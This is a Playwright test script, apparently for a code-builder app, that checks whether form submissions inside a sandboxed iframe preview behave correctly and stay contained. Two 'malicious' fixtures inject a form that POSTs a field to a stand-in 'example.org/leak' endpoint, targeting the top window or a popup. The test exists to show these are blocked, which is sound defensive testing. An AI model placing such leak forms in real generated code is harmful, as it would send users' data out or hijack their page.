/* eslint-disable max-depth -- seven bounded causal/security variants share one isolated test browser */
/** Trusted fixtures: causal sandbox-submit proof, no AI and no live mutation. */
import {createServer} from "vite";
import {chromium} from "@playwright/test";
const server=await createServer({root:process.cwd(),configFile:false,
 appType:"spa",logLevel:"error",server:{host:"127.0.0.1",port:0,hmr:false}});
let browser;
const fixture=`
document.getElementById("app").innerHTML='<form id="f" novalidate><label>數量<input id="n" type="number" value="1"></label><button id="go" type="submit">計算</button><button id="reset" type="reset">重設</button><output id="out">0</output><output id="calls">0</output></form>';
const form=document.getElementById("f"),input=document.getElementById("n"),out=document.getElementById("out"),counter=document.getElementById("calls");
let calls=0;
form.addEventListener("submit",event=>{event.preventDefault();calls++;out.textContent=String(Number(input.value)*3);counter.textContent=String(calls);});
form.addEventListener("reset",()=>{out.textContent="0";});
`;
try{
 await server.listen();
 const address=server.httpServer.address();
 if(!address||typeof address!=="object")throw Error("FORM_FIXTURE_SERVER_MISSING");
 const origin="http://127.0.0.1:"+address.port;
 browser=await chromium.launch({headless:true});
 const page=await browser.newPage();
 let outgoing=0;
 await page.route("https://example.org/**",route=>{outgoing++;return route.abort();});
 await page.route("**/__forms__",route=>route.fulfill({status:200,
  contentType:"text/html",body:'<h1 id="host">UNCHANGED_HOST</h1>'}));
 await page.goto(origin+"/__forms__");
 for(const mode of ["without-adapter","public","private","click-prevented","invalid","malicious-top","malicious-blank"]){
  const result=await page.evaluate(async({mode,fixture})=>{
   const doc=globalThis.document;
   const contract=await import("/src/platform/blueprint/code-artifact-v2.ts");
   const host=await import("/src/app/runtime/code-artifact-frame.ts");
   const adapter=await import("/src/app/runtime/code-dom-events.ts");
   let javascript=fixture;
   if(mode==="click-prevented")javascript+='document.getElementById("go").addEventListener("click",event=>{event.preventDefault();out.textContent="CLICK_ONLY";});';
   if(mode==="invalid")javascript+='form.removeAttribute("novalidate");input.min="1";';
   if(mode.startsWith("malicious"))javascript='document.getElementById("app").innerHTML=\'<form action="https://example.org/leak" method="POST" target="'+(mode==="malicious-top"?"_top":"_blank")+'"><input name="fake" value="non-secret-fixture"><button id="go" type="submit">送出</button></form>\';';
   let iframe;
   if(mode==="private"){
    const preview=await import("/src/app/code-builder/agent-private-preview.ts");
    iframe=await preview.createPrivatePreviewFrame({
     project_hash:"sha256:"+"a".repeat(64),javascript,css:"",
     index_html:'<main id="app"></main><script type="module" src="/assets/form.js"></script>'
    },doc);
   }else{
    const pack=await contract.makePrototypeCodeArtifact(mode,javascript);
    const mounted=await host.createPrototypeCodeFrame(pack,doc);
    iframe=mounted.iframe;
    if(mode==="without-adapter")iframe.srcdoc=iframe.srcdoc.replace(
     "<script>"+adapter.CODE_DOM_EVENT_SCRIPT+"</script>","");
   }
   iframe.title=mode;doc.body.appendChild(iframe);
   return {sandbox:iframe.getAttribute("sandbox"),html:iframe.srcdoc};
  },{mode,fixture});
  if(result.sandbox!=="allow-scripts"||
   !result.html.includes("form-action &#39;none&#39;")&&
   !result.html.includes("form-action 'none'")||
   !result.html.includes("connect-src"))
   throw Error("SANDBOX_PERMISSIONS_WIDENED");
  const frame=page.frameLocator('iframe[title="'+mode+'"]');
  await frame.locator("#go").waitFor({state:"visible",timeout:15000});
  if(mode.startsWith("malicious")){
   await frame.locator("#go").click();
  }else{
   await frame.locator("#n").fill(mode==="invalid"?"-1":"4");
   await frame.locator("#go").click();
   const expected=mode==="without-adapter"||mode==="invalid"?"0":
    mode==="click-prevented"?"CLICK_ONLY":"12";
   if(await frame.locator("#out").innerText()!==expected)
    throw Error("FORM_EVENT_CAUSAL_PROOF_FAIL_"+mode);
   if(["public","private"].includes(mode)){
    if(await frame.locator("#calls").innerText()!=="1")throw Error("DUPLICATE_SUBMIT");
    await frame.locator("#reset").click();
    if(await frame.locator("#out").innerText()!=="0")throw Error("RESET_FAILED");
   }
  }
  console.log("LOCAL_NO_NETWORK_FORM_EVENT_PROOF_PASS "+mode);
 }
 await page.waitForTimeout(500);
 if(outgoing!==0||await page.locator("#host").innerText()!=="UNCHANGED_HOST"||
  (await browser.contexts()[0].pages()).length!==1)
  throw Error("FORM_EFFECT_ESCAPED_SANDBOX");
 console.log("FORM_EVENT_STRATEGY_FREE_PASS: baseline rejects; public/private submit events work; validation/reset/click-prevented; form POST/popups/navigation blocked; sandbox unchanged; zero AI");
}finally{
 await browser?.close();
 await server.close();
}
